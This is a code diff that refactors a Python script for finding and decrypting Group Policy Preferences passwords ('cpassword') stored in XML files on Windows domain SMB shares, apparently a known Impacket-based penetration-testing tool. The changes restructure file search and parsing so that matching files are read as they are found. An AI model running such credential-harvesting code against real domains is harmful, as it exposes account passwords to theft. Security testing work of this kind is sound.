@@ -1,4 +1,4 @@
-# !/usr/bin/env python3
+#!/usr/bin/env python3
 #
 # Description: Python script for extracting and decrypting Group Policy Preferences passwords,
 # using Impacket's lib, and using streams for carving files instead of mounting shares
@@ -43,7 +43,7 @@ class GetGPPasswords(object):
             print('  - %s' % resp[k]['shi1_netname'][:-1])
         print()
 
-    def find_files(self, base_dir, extension='xml'):
+    def find_cpasswords(self, base_dir, extension='xml'):
         logging.info("Searching *.%s files..." % extension)
         # Breadth-first search algorithm to recursively find .extension files
         files = []
@@ -59,37 +59,35 @@ class GetGPPasswords(object):
                             next_dirs.append(sdir + sharedfile.get_longname() + '/')
                         else:
                             if sharedfile.get_longname().endswith('.' + extension):
-                                logging.info('Found matching file %s' % (sdir + sharedfile.get_longname()))
-                                files.append(sdir + sharedfile.get_longname())
+                                logging.debug('Found matching file %s' % (sdir + sharedfile.get_longname()))
+                                results = self.parse(sdir + sharedfile.get_longname())
+                                if len(results) != 0:
+                                    self.show(results)
+                                    files.append({"filename": sdir + sharedfile.get_longname(), "results": results})
                             else:
                                 logging.debug('Found file %s' % sharedfile.get_longname())
             searchdirs = next_dirs
             logging.debug('Next iteration with %d folders.' % len(next_dirs))
-        logging.debug('Found %d %s files' % (len(files), extension))
-        logging.debug('Printing matching files...')
-        for f in files:
-            logging.debug('  - %s' % f)
         return files
-    print()
 
-    def parse(self, files=[]):
+    def parse(self, filename):
         results = []
-        for filename in files:
-            filename = filename.replace('/', '\\')
-            fh = BytesIO()
-            try:
-                # opening the files in streams instead of mounting shares allows for running the script from
-                # unprivileged containers
-                self.smb.getFile(self.share, filename, fh.write)
-            except SessionError as e:
-                logging.error(e)
-                return results
-            except Exception as e:
-                raise
-            output = fh.getvalue()
-            encoding = chardet.detect(output)["encoding"]
-            if encoding != None:
-                filecontent = output.decode(encoding)
+        filename = filename.replace('/', '\\')
+        fh = BytesIO()
+        try:
+            # opening the files in streams instead of mounting shares allows for running the script from
+            # unprivileged containers
+            self.smb.getFile(self.share, filename, fh.write)
+        except SessionError as e:
+            logging.error(e)
+            return results
+        except Exception as e:
+            raise
+        output = fh.getvalue()
+        encoding = chardet.detect(output)["encoding"]
+        if encoding != None:
+            filecontent = output.decode(encoding)
+            if 'cpassword' in filecontent:
                 logging.debug(filecontent)
                 root = minidom.parseString(filecontent)
                 properties_list = root.getElementsByTagName("Properties")
@@ -107,8 +105,10 @@ class GetGPPasswords(object):
                     })
                 fh.close()
             else:
-                logging.error("Output cannot be correctly decoded, are you sure the text is readable ?")
-                fh.close()
+                logging.debug("No cpassword was found in %s" % filename)
+        else:
+            logging.error("Output cannot be correctly decoded, are you sure the text is readable ?")
+            fh.close()
         print()
         return results
 
@@ -249,9 +249,7 @@ def main():
         smbClient= init_smb_session(args, domain, username, password, address, lmhash, nthash)
         g = GetGPPasswords(smbClient, args.share)
         g.list_shares()
-        files = g.find_files(args.base_dir)
-        results = g.parse(files)
-        g.show(results)
+        g.find_cpasswords(args.base_dir)
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             traceback.print_exc()
